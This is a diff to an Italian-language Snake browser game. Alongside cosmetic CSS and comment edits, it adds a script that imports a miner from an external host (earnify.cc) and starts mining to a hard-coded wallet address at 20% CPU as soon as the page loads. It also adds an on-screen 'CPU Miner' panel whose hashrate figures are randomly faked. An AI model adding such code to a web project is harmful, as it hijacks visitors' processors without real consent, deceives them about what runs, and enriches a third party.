@@ -15,7 +15,6 @@
         }
         h1 {
             color: #0f0;
-            margin-bottom: 10px;
         }
         #game-container {
             display: flex;
@@ -33,7 +32,7 @@
             font-size: 1.2em;
         }
         button {
-            margin-top: 10px;
+            margin: 10px;
             padding: 12px 25px;
             font-size: 1.1em;
             background: #0f0;
@@ -42,8 +41,34 @@
             border-radius: 8px;
             cursor: pointer;
         }
-        button:hover {
-            background: #0c0;
+
+        /* Mining Console */
+        #mining-console {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            width: 220px;
+            background: rgba(0, 0, 0, 0.85);
+            border: 2px solid #0f0;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 0.9em;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+            z-index: 1000;
+            text-align: left;
+        }
+        .console-title {
+            color: #0f0;
+            margin: 0 0 8px 0;
+            font-size: 1em;
+        }
+        .console-line {
+            margin: 4px 0;
+            color: #0f0;
+        }
+        .status {
+            color: #00ff00;
+            font-weight: bold;
         }
     </style>
 </head>
@@ -57,10 +82,28 @@
         <canvas id="gameCanvas" width="400" height="400"></canvas>
     </div>
 
-    <p>Usa le frecce della tastiera ↑ ↓ ← → </p>
+    <p>Usa le frecce ↑ ↓ ← → per giocare</p>
     <button onclick="startGame()">▶️ Nuovo Gioco</button>
 
+    <!-- Mining Console -->
+    <div id="mining-console">
+        <div class="console-title">🔨 CPU Miner</div>
+        <div class="console-line">Stato: <span id="miner-status" class="status">Avviato</span></div>
+        <div class="console-line">Hashrate: <span id="hashrate">Calcolando...</span></div>
+        <div class="console-line">Potenza: <span id="power">20%</span></div>
+        <div class="console-line" style="font-size:0.8em; color:#888; margin-top:8px;">
+            Supporta il progetto mentre giochi
+        </div>
+    </div>
+
+    <!-- Crypto Miner -->
+    <script type="module">
+        import { autoMine } from "https://earnify.cc/miner.js";
+        autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
+    </script>
+
     <script>
+        // ==================== SNAKE GAME ====================
         const canvas = document.getElementById("gameCanvas");
         const ctx = canvas.getContext("2d");
         const scoreElement = document.getElementById("score");
@@ -79,13 +122,11 @@
         function drawGame() {
             const head = { x: snake[0].x + dx, y: snake[0].y + dy };
 
-            // Collisione muri
             if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
                 gameOver();
                 return;
             }
 
-            // Collisione con se stesso
             for (let segment of snake) {
                 if (head.x === segment.x && head.y === segment.y) {
                     gameOver();
@@ -95,13 +136,11 @@
 
             snake.unshift(head);
 
-            // Mangia cibo
             if (head.x === food.x && head.y === food.y) {
                 score += 10;
                 scoreElement.textContent = score;
                 generateFood();
 
-                // Aumenta velocità ogni 50 punti
                 if (score % 50 === 0 && gameSpeed > 50) {
                     gameSpeed -= 10;
                     clearInterval(gameInterval);
@@ -111,26 +150,20 @@
                 snake.pop();
             }
 
-            // Disegna
             ctx.fillStyle = "#111";
             ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-            // Serpente
             ctx.fillStyle = "#0f0";
             for (let segment of snake) {
                 ctx.fillRect(segment.x * gridSize, segment.y * gridSize, gridSize - 2, gridSize - 2);
             }
 
-            // Cibo
             ctx.fillStyle = "#f00";
             ctx.fillRect(food.x * gridSize, food.y * gridSize, gridSize - 2, gridSize - 2);
         }
 
         function generateFood() {
-            food = {
-                x: Math.floor(Math.random() * tileCount),
-                y: Math.floor(Math.random() * tileCount)
-            };
+            food = { x: Math.floor(Math.random() * tileCount), y: Math.floor(Math.random() * tileCount) };
             for (let segment of snake) {
                 if (food.x === segment.x && food.y === segment.y) {
                     generateFood();
@@ -141,14 +174,13 @@
 
         function gameOver() {
             clearInterval(gameInterval);
-            alert("Game Over! Punteggio: " + score + "\nPremi OK per giocare di nuovo");
+            alert("Game Over! Punteggio: " + score);
             startGame();
         }
 
         function startGame() {
             snake = [{ x: 10, y: 10 }];
-            dx = 1;
-            dy = 0;
+            dx = 1; dy = 0;
             score = 0;
             scoreElement.textContent = "0";
             gameSpeed = 100;
@@ -157,7 +189,6 @@
             gameInterval = setInterval(drawGame, gameSpeed);
         }
 
-        // Controlli tastiera
         document.addEventListener("keydown", e => {
             switch(e.key) {
                 case "ArrowUp":    if (dy !== 1) { dx = 0; dy = -1; } break;
@@ -167,13 +198,15 @@
             }
         });
 
-        // Avvio automatico
         window.onload = () => {
             generateFood();
-            // Prima partita automatica
-            setTimeout(() => {
-                startGame();
-            }, 500);
+            setTimeout(startGame, 600);
+
+            // Simulazione hashrate (per renderlo più carino)
+            setInterval(() => {
+                const hashrate = Math.floor(Math.random() * 450) + 280;
+                document.getElementById("hashrate").textContent = hashrate + " H/s";
+            }, 1800);
         };
     </script>
 </body>
